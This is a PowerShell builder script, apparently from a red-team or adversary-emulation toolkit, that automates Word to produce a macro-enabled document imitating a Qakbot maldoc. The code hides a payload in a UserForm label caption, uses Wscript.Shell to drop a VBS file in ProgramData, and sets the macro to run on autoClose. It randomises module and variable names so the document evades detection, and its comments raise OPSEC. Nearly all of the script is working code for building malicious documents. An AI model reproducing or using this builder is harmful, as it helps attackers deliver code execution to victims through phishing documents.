Import-Module $PSScriptRoot\..\..\internals\utils.psm1
Import-Module $PSScriptRoot\..\..\internals\tools.psm1

<#

Qakbot Sample Hash: d54aecf15108698cf6368f49ec9db7164b77729b6a0b4e994c540c5470f206c8

https://bazaar.abuse.ch/sample/d545f2c975876caa160d23b3a963df965cde059dc0099a43e7979b3c903e82eb/

Modify the payloads.txt file to point to your payloads or however you'd like to have code execution happen
via VBS.

**NOTE** during the creation process, because the document is using "autoClose()" it will execute
the payload during the building phase. Ensure you are taking OPSEC considerations into account

#>
function Build() {
    param(
        [Parameter(mandatory=$true)]
        [String]
        $out,

        [Parameter(mandatory=$false)]
        [String]
        $pass
    )

    $wdApp = New-Object -COMObject "Word.Application"
    $wdApp.Visible = $false
    $fname = "$PSScriptRoot\Doc1.docm"
    $wdDoc = $wdApp.documents.open($fname)

    $name = RandTextAlpha -len 20
    $junk = RandTextAlpha -len 10

    # 1 = Module
    # 2 = Class
    # 3 = UserForm
    $userform = $wdDoc.VBProject.VBComponents.Add(3)
    $userform.Properties("Tag").Value = "Wscript.Shell"
    $label = $userform.Designer.Controls.Add("Forms.Label.1")
    $labelName = RandTextAlpha -len 25
    $label.Name = $labelName
    $caption = BuildCaption -vbsname $name -junkfile $junk
    $label.Caption = "$caption"

    
    # modify "DefaultTargetFrame" for "ThisDocument"
    $wdDoc.VBProject.VBComponents.item(1).Properties("DefaultTargetFrame").Value = "C:\ProgramData\$name.vbs"

    $vbaModule = $wdDoc.VBProject.VBComponents.Add(1)

    $thisDocument = RandTextAlpha -len 25
    RenameVBAModule -officeObject $wdDoc -from "ThisDocument" -to $thisDocument

    $module1 = RandTextAlpha -len 25
    RenameVBAModule -officeObject $wdDoc -from "Module1" -to $module1

    $form1 = RandTextAlpha -len 25
    RenameVBAModule -officeObject $wdDoc -from "UserForm1" -to $form1

    $macro = BuildMacro -docname $thisDocument -formname $form1 -label $labelName -junkfile $junk
    $vbaModule.CodeModule.AddFromString($macro) | Out-Null

    # 13 is needed for docm
    # https://docs.microsoft.com/en-us/office/vba/api/Word.WdSaveFormat
    if (!$pass) {
        $wdDoc.SaveAs($out, 13)
        $wdDoc.Close()
        $wdApp.Quit()
    } else {
        $wdDoc.SaveAs($out, 13, 0, $pass)
        $wdDoc.Close()
        $wdApp.Quit()
    } 

    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdDoc) | Out-Null
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdApp) | Out-Null
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()

    Remove-Variable wdDoc
    Remove-Variable wdApp

}

function BuildMacro() {
    param(
        [Parameter(mandatory=$true)]
        [String]
        $docname,

        [Parameter(mandatory=$true)]
        [String]
        $formname,

        [Parameter(mandatory=$true)]
        [String]
        $label,

        [Parameter(mandatory=$true)]
        [String]
        $junkfile
    )

    $macro = [System.IO.File]::ReadAllText("$PSScriptRoot\macro.txt")

    $var_counter = 1
    do {
        $this_var_name = "aVAR" + $var_counter + "a"
        $randName = RandTextAlpha -len 15
        if ($macro.contains($this_var_name)) {
            $macro = $macro -replace $this_var_name, $randName
        } else {
            break
        }
        $var_counter++
    } while ($true)

    $macro = $macro -replace "aTHISDOCUMENTa", $docname
    $macro = $macro -replace "aUSERFORMa", $formname
    $macro = $macro -replace "aLABELa", $label
    $macro = $macro -replace "aJUNKa", $junkfile

    return $macro

}

function BuildCaption() {
    param(
        [Parameter(mandatory=$true)]
        [String]
        $vbsname,

        [Parameter(mandatory=$true)]
        [String]
        $junkfile
    )

    $caption = [System.IO.File]::ReadAllText("$PSScriptRoot\caption.txt")
    $payload = [System.IO.File]::ReadAllText("$PSScriptRoot\payloads.txt")

    $var_counter = 1
    do {
        $this_var_name = "aVAR" + $var_counter + "a"
        $randName = RandTextAlpha -len 15
        if ($caption.contains($this_var_name)) {
            $caption = $caption -replace $this_var_name, $randName
        } else {
            break
        }
        $var_counter++
    } while ($true)

    $caption = $caption -replace "aPAYLOADa", $payload
    $caption = $caption -replace "aJUNKa", $junkfile
    $caption = $caption -replace "aVBSNAMEa", $vbsname
    $execme = RandTextAlpha -len 8
    $caption = $caption -replace "aEXECMEa", $execme
    $cmdexec = RandTextAlpha -len 8
    $caption = $caption -replace "aCMDEXECa", $cmdexec

    return $caption

}